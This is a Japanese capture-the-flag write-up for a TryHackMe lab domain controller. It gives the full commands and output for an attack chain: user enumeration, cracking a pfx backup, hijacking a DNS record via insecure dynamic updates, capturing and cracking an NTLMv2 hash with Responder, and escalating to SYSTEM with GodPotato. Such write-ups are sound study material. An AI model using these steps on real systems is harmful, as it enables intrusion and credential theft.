# Ra 2 CTF

https://tryhackme.com/room/ra2

## Enumeration

```shell
TARGET=10.48.173.61
sudo bash -c "echo $TARGET   ra2.thm fire.windcorp.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
80/tcp    open  http             syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
443/tcp   open  https            syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
2179/tcp  open  vmrdp            syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
3389/tcp  open  ms-wbt-server    syn-ack ttl 128
5222/tcp  open  xmpp-client      syn-ack ttl 128
5223/tcp  open  hpvirtgrp        syn-ack ttl 128
5229/tcp  open  jaxflow          syn-ack ttl 128
5262/tcp  open  unknown          syn-ack ttl 128
5263/tcp  open  unknown          syn-ack ttl 128
5269/tcp  open  xmpp-server      syn-ack ttl 128
5270/tcp  open  xmp              syn-ack ttl 128
5275/tcp  open  unknown          syn-ack ttl 128
5276/tcp  open  unknown          syn-ack ttl 128
7070/tcp  open  realserver       syn-ack ttl 128
7443/tcp  open  oracleas-https   syn-ack ttl 128
7777/tcp  open  cbt              syn-ack ttl 128
9090/tcp  open  zeus-admin       syn-ack ttl 128
9091/tcp  open  xmltec-xmlmail   syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
49667/tcp open  unknown          syn-ack ttl 128
49668/tcp open  unknown          syn-ack ttl 128
49669/tcp open  unknown          syn-ack ttl 128
49670/tcp open  unknown          syn-ack ttl 128
49671/tcp open  unknown          syn-ack ttl 128
49689/tcp open  unknown          syn-ack ttl 128
49703/tcp open  unknown          syn-ack ttl 128
```

```sh
sudo nmap -sV -p53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,3389,5222,5223,5229,5262,5263,5269,5270,5275,5276,7070,7443,7777,9090,9091,9389,49667,49668,49669,49670,49671,49689,49703 $TARGET

PORT      STATE SERVICE             VERSION
53/tcp    open  domain?
80/tcp    open  http                Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2026-03-14 00:36:26Z)
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
2179/tcp  open  vmrdp?
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server       Microsoft Terminal Services
5222/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
5223/tcp  open  ssl/hpvirtgrp?
5229/tcp  open  jaxflow?
5262/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
5263/tcp  open  ssl/unknown
5269/tcp  open  xmpp                Wildfire XMPP Client
5270/tcp  open  ssl/xmp?
5275/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
5276/tcp  open  ssl/unknown
7070/tcp  open  http                Jetty 9.4.18.v20190429
7443/tcp  open  ssl/http            Jetty 9.4.18.v20190429
7777/tcp  open  socks5              (No authentication; connection failed)
9090/tcp  open  zeus-admin?
9091/tcp  open  ssl/xmltec-xmlmail?
9389/tcp  open  mc-nmf              .NET Message Framing
49667/tcp open  msrpc               Microsoft Windows RPC
49668/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc               Microsoft Windows RPC
49670/tcp open  msrpc               Microsoft Windows RPC
49671/tcp open  msrpc               Microsoft Windows RPC
49689/tcp open  msrpc               Microsoft Windows RPC
49703/tcp open  msrpc               Microsoft Windows RPC
```

HTMLから入手したユーザー名

```
organicfish718
organicwolf509
tinywolf424
angrybird253
buse
Edeltraut
Edward
Emile
tinygoose102
brownostrich284
sadswan869
goldencat416
whiteleopard529
happymeercat399
orangegorilla428
```

画像部分から人名

```
Emilieje(Emily Jensen)
lilyleAndSparky(Lily Levesque)
kirkug(Kirk Uglas)
```

サブドメインは画面で見えている2つだけ。

```sh
root@ip-10-49-81-122:~# ffuf -u https://windcorp.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.windcorp.thm' -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : https://windcorp.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.windcorp.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 404
________________________________________________

fire                    [Status: 200, Size: 11832, Words: 2298, Lines: 279]
selfservice             [Status: 401, Size: 1293, Words: 81, Lines: 30]
:: Progress: [114532/114532] :: Job [1/1] :: 87 req/sec :: Duration: [0:24:39] :: Errors: 0 ::
```

dirsearch でPowershellのインターフェースを発見。認証画面が表示される。

```sh
[01:54:07] 302 -  168B  - /powershell/  ->  /powershell/default.aspx?ReturnUrl=%2fpowershell%2f
```

### SMB, NFS, LDAP

```sh
enum4linux-ng -A $TARGET

 ===========================================================
|    Domain Information via SMB session for 10.48.177.43    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: FIRE                                                                                         
NetBIOS domain name: WINDCORP                                                                                       
DNS domain: windcorp.thm                                                                                            
FQDN: Fire.windcorp.thm                                                                                             
Derived membership: domain member                                                                                   
Derived domain: WINDCORP
```

無名ログイン不可

```sh
smbclient -L //$TARGET -U ""
smbclient -L //$TARGET -N
```

guest無効

```sh
nxc smb $TARGET -u 'guest' -p '' --shares
```

## kerberos

有効なユーザー名を確認

```sh
$ ~/tools/kerbrute userenum --dc windcorp.thm -d windcorp.thm User.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/13/26 - Ronnie Flathers @ropnop

2026/03/13 20:54:15 >  Using KDC(s):
2026/03/13 20:54:15 >   windcorp.thm:88

2026/03/13 20:54:15 >  [+] VALID USERNAME:       Emile@windcorp.thm
2026/03/13 20:54:15 >  [+] VALID USERNAME:       organicfish718@windcorp.thm
2026/03/13 20:54:15 >  [+] VALID USERNAME:       brownostrich284@windcorp.thm
2026/03/13 20:54:15 >  [+] VALID USERNAME:       angrybird253@windcorp.thm
2026/03/13 20:54:15 >  [+] VALID USERNAME:       Edeltraut@windcorp.thm
2026/03/13 20:54:15 >  [+] VALID USERNAME:       tinygoose102@windcorp.thm
2026/03/13 20:54:15 >  [+] VALID USERNAME:       buse@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       goldencat416@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       sadswan869@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       orangegorilla428@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       emilieje@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       whiteleopard529@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       kirkug@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       happymeercat399@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       lilyle@windcorp.thm
2026/03/13 20:54:16 >  Done! Tested 19 usernames (15 valid) in 0.295 seconds
```

AS-REP Roasting無効

```sh
$ GetNPUsers.py -dc-ip $TARGET windcorp.thm/ -usersfile names.txt
Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

[-] User emile doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User organicfish718 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User brownostrich284 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User angrybird253 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Edeltraut doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tinygoose102 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User buse doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User goldencat416 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sadswan869 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User orangegorilla428 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User emilieje doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User whiteleopard529 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kirkug doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User happymeercat399 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lilyle doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Burpを通さずにHTTPS証明書を確認したところ、selfservice.dev.windcorp.thm が表示されていた。

```
DNS Name: fire.windcorp.thm
DNS Name: selfservice.windcorp.thm
DNS Name: selfservice.dev.windcorp.thm
```

表示したら、工事中の表示。  
dirb で /backup を発見。2ファイル入っていた。web.configはリンク切れ。

```
 5/28/2020  8:41 PM         2827 cert.pfx
 5/28/2020  8:45 PM          168 web.config
```

hashを出力

```sh
$ pfx2john ./cert.pfx > pfx_hash
```

rockyouで一瞬でパスワードは判明した。

```sh
$ john --wordlist=/usr/share/wordlists/rockyou.txt ./pfx_hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]          (cert.pfx)     
1g 0:00:00:00 DONE (2026-03-14 23:01) 3.448g/s 7062p/s 7062c/s 7062C/s clover..lovers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

パスワードを使ってpfxファイルを開けた。

```sh
$ openssl pkcs12 -info -in ./cert.pfx
Enter Import Password:
MAC: sha256, Iteration 2000
MAC length: 32, salt length: 20
PKCS7 Data
Shrouded Keybag: PBES2, PBKDF2, AES-256-CBC, Iteration 2000, PRF hmacWithSHA256
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4b942170-a078-48b3-80cb-e73333376b73
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFNTBfBgkqhkiG9w0BBQ0wUjAxBgkqhkiG9w0BBQwwJAQQ1bXL7VmVPj5AKepU
略
m6tDxKdrLcEzemtwqJgE4qmreybygZUUAAzpbbrYmLOjTLl9FK6c2+8=
-----END ENCRYPTED PRIVATE KEY-----
PKCS7 Encrypted data: PBES2, PBKDF2, AES-256-CBC, Iteration 2000, PRF hmacWithSHA256
Certificate bag
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN=fire.windcorp.thm
issuer=CN=fire.windcorp.thm
-----BEGIN CERTIFICATE-----
MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
略
MTUqFyYKchFUeYlgf7k=
-----END CERTIFICATE-----
```

これを使って、fire.windcorp.thm の下のサービスを認証できる可能性がある。  
/powershell のインターフェースがあったことを思い出す。

Firefoxでpfxファイルをインポートして /poershell にアクセスしたが、変わらず認証画面が表示されただけ。selfservice の方も変わらずBASIC認証が表示された。

行き詰ってウォークスルーを見た。  
dnsrecon でフラグ１が表示される。

```sh
$ dnsrecon -d windcorp.thm -n $TARGET 
[*] std: Performing General Enumeration against: windcorp.thm...
[-] DNSSEC is not configured for windcorp.thm
[*]      SOA fire.windcorp.thm 192.168.112.1
[*]      SOA fire.windcorp.thm 10.48.173.61
[*]      NS fire.windcorp.thm 192.168.112.1
[*]      NS fire.windcorp.thm 10.48.173.61
[*]      A windcorp.thm 10.48.173.61
[*]      TXT windcorp.thm THM{[REDACTED]}
[*] Enumerating SRV Records
[+]      SRV _kerberos._tcp.windcorp.thm fire.windcorp.thm 10.48.173.61 88
[+]      SRV _kerberos._tcp.windcorp.thm fire.windcorp.thm 192.168.112.1 88
[+]      SRV _kerberos._udp.windcorp.thm fire.windcorp.thm 192.168.112.1 88
[+]      SRV _kerberos._udp.windcorp.thm fire.windcorp.thm 10.48.173.61 88
[+]      SRV _gc._tcp.windcorp.thm fire.windcorp.thm 10.48.173.61 3268
[+]      SRV _gc._tcp.windcorp.thm fire.windcorp.thm 192.168.112.1 3268
[+]      SRV _ldap._tcp.windcorp.thm fire.windcorp.thm 192.168.112.1 389
[+]      SRV _ldap._tcp.windcorp.thm fire.windcorp.thm 10.48.173.61 389
[+]      SRV _ldap._tcp.ForestDNSZones.windcorp.thm fire.windcorp.thm 192.168.112.1 389
[+]      SRV _ldap._tcp.ForestDNSZones.windcorp.thm fire.windcorp.thm 10.48.173.61 389
[+]      SRV _ldap._tcp.pdc._msdcs.windcorp.thm fire.windcorp.thm 10.48.173.61 389
[+]      SRV _ldap._tcp.pdc._msdcs.windcorp.thm fire.windcorp.thm 192.168.112.1 389
[+]      SRV _ldap._tcp.dc._msdcs.windcorp.thm fire.windcorp.thm 192.168.112.1 389
[+]      SRV _ldap._tcp.dc._msdcs.windcorp.thm fire.windcorp.thm 10.48.173.61 389
[+]      SRV _ldap._tcp.gc._msdcs.windcorp.thm fire.windcorp.thm 10.48.173.61 3268
[+]      SRV _ldap._tcp.gc._msdcs.windcorp.thm fire.windcorp.thm 192.168.112.1 3268
[+]      SRV _kpasswd._tcp.windcorp.thm fire.windcorp.thm 192.168.112.1 464
[+]      SRV _kpasswd._tcp.windcorp.thm fire.windcorp.thm 10.48.173.61 464
[+]      SRV _kerberos._tcp.dc._msdcs.windcorp.thm fire.windcorp.thm 192.168.112.1 88
[+]      SRV _kerberos._tcp.dc._msdcs.windcorp.thm fire.windcorp.thm 10.48.173.61 88
[+]      SRV _kpasswd._udp.windcorp.thm fire.windcorp.thm 10.48.173.61 464
[+]      SRV _kpasswd._udp.windcorp.thm fire.windcorp.thm 192.168.112.1 464
[+] 22 Records Found
```

フラグの文章がこうなっている。

```
安全でない動的更新を許可することは、信頼できないソースからの更新を受け入れる可能性があるため、重大なセキュリティ脆弱性となります。
```

DNS動的更新で、selfservice を自分のマシンに向けさせる。

```sh
$ nsupdate
> server 10.48.173.61
> update delete selfservice.windcorp.thm
> send
> update add selfservice.windcorp.thm 600 A 192.168.129.39
> send
```

pfxファイル＋responderで、ハッシュをキャッチ。  
これはhashcatでクラックでき、edwardle のパスワードを入手成功。

```sh
nano /etc/responder/Responder.conf

[HTTPS Server]
; Configure SSL Certificates to use
SSLCert = /home/kali/ctf/ra2/cert.pem
SSLKey = /home/kali/ctf/ra2/key.pem
```

```sh
[HTTP] NTLMv2 Client   : 10.48.173.61
[HTTP] NTLMv2 Username : WINDCORP\edwardle
[HTTP] NTLMv2 Hash     : edwardle::WINDCORP:fe2b731aef5cbb5d:079EECCE7F93E6C488BF1076FCA3863F:0101000000000000BE0F[REDACTED]                                                               
[*] Skipping previously captured hash for WINDCORP\edwardle
```

RDP, SMBで認証成功。ただし、RDPは実際に接続しても権限不足で表示できなかった。

```sh
$ nxc winrm $TARGET -u 'edwardle' -p '[REDACTED]'
nxc rdp $TARGET -u 'edwardle' -p '[REDACTED]'
nxc smb $TARGET -u 'edwardle' -p '[REDACTED]'

RDP         10.49.171.189   3389   FIRE             [*] Windows 10 or Windows Server 2016 Build 17763 (name:FIRE) (domain:windcorp.thm) (nla:True)
RDP         10.49.171.189   3389   FIRE             [+] windcorp.thm\edwardle:[REDACTED] (Pwn3d!)
SMB         10.49.171.189   445    FIRE             [*] Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
SMB         10.49.171.189   445    FIRE             [+] windcorp.thm\edwardle:[REDACTED] 
```

ケルベロースティングでは何も出ず。

```sh
$ GetUserSPNs.py 'windcorp.thm/edwardle:[REDACTED]' -dc-ip $TARGET -request
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

Shared, Users 共有を発見。Sharedは空。

```sh
$ smbclient -L //$TARGET -U "windcorp\edwardle"
Password for [WINDCORP\edwardle]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shared          Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk
```

```sh
$ smbclient //$TARGET/Users -U "windcorp\edwardle"
Password for [WINDCORP\edwardle]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Mon Jun  1 08:51:05 2020
  ..                                 DR        0  Mon Jun  1 08:51:05 2020
  .NET v4.5                           D        0  Sat May 30 13:57:25 2020
  .NET v4.5 Classic                   D        0  Sat May 30 13:57:20 2020
  Administrator                       D        0  Sun May 10 07:18:11 2020
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  angrybird                           D        0  Fri May  1 08:59:20 2020
  berg                                D        0  Fri May  1 08:59:20 2020
  bluefrog579                         D        0  Fri May  1 08:59:20 2020
  brittanycr                          D        0  Sat May  2 19:36:46 2020
  brownostrich284                     D        0  Fri May  1 08:59:20 2020
  buse                                D        0  Thu May 28 21:20:53 2020
  Default                           DHR        0  Thu Apr 30 19:35:11 2020
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
  edwardle.WINDCORP                   D        0  Fri May 29 01:31:47 2020
  freddy                              D        0  Sat May  2 19:30:16 2020
  garys                               D        0  Fri May  1 08:59:20 2020
  goldencat416                        D        0  Mon Mar 16 01:36:36 2026
  goldenwol                           D        0  Fri May  1 08:59:20 2020
  happ                                D        0  Fri May  1 08:59:20 2020
  happyme                             D        0  Fri May  1 08:59:20 2020
  Luis                                D        0  Fri May  1 08:59:20 2020
  orga                                D        0  Fri May  1 08:59:20 2020
  organicf                            D        0  Fri May  1 08:59:20 2020
  organicfish718                      D        0  Mon Mar 16 01:32:34 2026
  pete                                D        0  Fri May  1 08:59:20 2020
  Public                             DR        0  Thu Apr 30 10:35:47 2020
  purplecat                           D        0  Fri May  1 08:59:20 2020
  purplepanda                         D        0  Fri May  1 08:59:20 2020
  sadswan                             D        0  Fri May  1 08:59:20 2020
  sadswan869                          D        0  Mon Mar 16 01:32:19 2026
  sheela                              D        0  Fri May  1 08:59:20 2020
  silver                              D        0  Fri May  1 08:59:20 2020
  smallf                              D        0  Fri May  1 08:59:20 2020
  spiff                               D        0  Fri May  1 08:59:20 2020
  tinygoos                            D        0  Fri May  1 08:59:20 2020
  whiteleopard                        D        0  Fri May  1 08:59:20 2020

                15587583 blocks of size 4096. 10681195 blocks available
```

デスクトップでフラグを発見。

```sh
smb: \edwardle.WINDCORP\Desktop\> ls
  .                                  DR        0  Mon Jun  1 15:25:46 2020
  ..                                 DR        0  Mon Jun  1 15:25:46 2020
  desktop.ini                       AHS      282  Fri May 29 01:31:47 2020
  Flag 2.txt                          A       47  Sun May 31 13:12:25 2020
```

ダウンロードフォルダに怪しいファイルがある。

```sh
smb: \edwardle.WINDCORP\Downloads\> ls
  .                                  DR        0  Sat May 30 15:53:54 2020
  ..                                 DR        0  Sat May 30 15:53:54 2020
  desktop.ini                       AHS      282  Fri May 29 01:31:47 2020
  nc.exe                              A    59392  Sat May 30 15:53:54 2020
  NtApiDotNet.dll                     A  1761792  Sat May 30 15:37:29 2020
  SweetPotato.exe                     A   153600  Sat May 30 15:38:03 2020
```

## powershell

Web に powershell インターフェースがあったことを思い出した。  
https//fire.windcorp.thm/powershell にログインできた。

```ps
PS C:\Users\edwardle.WINDCORP\Documents> 
whoami
windcorp\edwardle
```

SeImpersonatePrivilege 権限が有効になっている。

```ps
PS C:\Users\edwardle.WINDCORP\Documents> 
whoami /priv
 
PRIVILEGES INFORMATION
----------------------
 
Privilege Name                Description                               State  
============================= ========================================= =======
SeMachineAccountPrivilege     Add workstations to domain                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

SweetPotato.exe がうまく動作しなかったので、GodPotato をアップロードした。

```ps
PS C:\Users\edwardle.WINDCORP\Downloads> 
.\GodPotato.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140728420728832
[*] DispatchTable: 0x140728423038160
[*] UseProtseqFunction: 0x140728422419312
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\5a9f28b8-3653-4466-86a2-22efdbd6081a\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00008c02-0f6c-ffff-20d4-0dff7229552f
[*] DCOM obj OXID: 0x3e53ede9a4f97872
[*] DCOM obj OID: 0xcdbfa7478d8f72c3
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 1000 Token:0x620  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 5896
```

管理者フラグを読む。

```ps
PS C:\Users\edwardle.WINDCORP\Downloads> 
.\GodPotato.exe -cmd 'cmd /c type C:\Users\Administrator\Desktop\Flag*3.txt'
[*] CombaseModule: 0x140728420728832
[*] DispatchTable: 0x140728423038160
[*] UseProtseqFunction: 0x140728422419312
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\cf1ffbfa-c3b0-455d-9363-12febb13b9dd\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000d402-15e8-ffff-c7ed-1f98a6d21b11
[*] DCOM obj OXID: 0x9909abe7e7a5038f
[*] DCOM obj OID: 0xa9606a6b71c62517
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 1000 Token:0x620  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1756
 
C:\Users\Administrator\Desktop\Flag 3.txt
 
 
THM{[REDACTED]}
```

## 振り返り

- dnsrecon のフラグ発見はかなり難しいと感じた。
- pfxファイル入手からDNS動的更新、Responderのコンボは初見でとても良い勉強になった。
- pfxファイルからキーや証明書をエクスポートする方法
- pfxファイルを Responder で使ってHTTPSサーバーとして動作する方法
- DNS動的更新の操作方法

## Tags

#tags:DNS #tags:Kerberos #tags:Windows #tags:Potato 
